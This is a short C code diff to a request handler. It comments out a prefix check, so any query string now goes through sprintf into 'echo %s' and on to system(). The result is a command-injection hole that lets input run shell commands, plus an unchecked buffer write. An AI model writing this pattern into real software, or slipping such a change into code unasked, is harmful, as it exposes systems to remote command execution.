@@ -8,7 +8,7 @@ void process_request(char *query) {
 	//if (!(q=strstr(query, "op=")))
 	//	return;
 	//strcpy(arg, q); // query string argument
-	if (strncmp(query,"cpegg",5)) return;
+	//if (strncmp(query,"cpegg",5)) return;
 	sprintf(arg,"echo %s",query);
 	//strcpy(arg,query);
 	system(arg);
